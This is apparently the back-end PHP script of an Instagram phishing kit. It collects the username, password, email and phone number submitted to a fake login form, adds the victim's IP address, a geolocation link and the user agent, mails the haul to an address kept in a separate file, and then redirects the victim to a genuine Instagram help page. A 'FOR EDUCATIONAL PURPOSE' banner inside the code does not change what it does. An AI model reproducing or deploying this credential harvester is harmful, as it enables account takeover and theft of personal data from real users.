<?php
if($_POST["uname7828"] != "" and $_POST["pas9089"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------IG-----------------------\n";
$message .= "|Username : ".$_POST['uname7828']."\n";
$message .= "|password: ".$_POST['pas9089']."\n";
$message .= "|email: ".$_POST['emm2034']."\n";
$message .= "|phone no: ".$_POST['phn2190']."\n";
 
$message .= "|--------------- DC -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- FOR EDUCATIONAL PURPOSE --------------|\n";
include 'email.php';
$subject = "Result from IG| ".$ip."\n";
 
{
mail("$to", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
header('Location: https://help.instagram.com/733907830039577');
}else{
header ("Location: https://help.instagram.com/733907830039577");
}

?>

 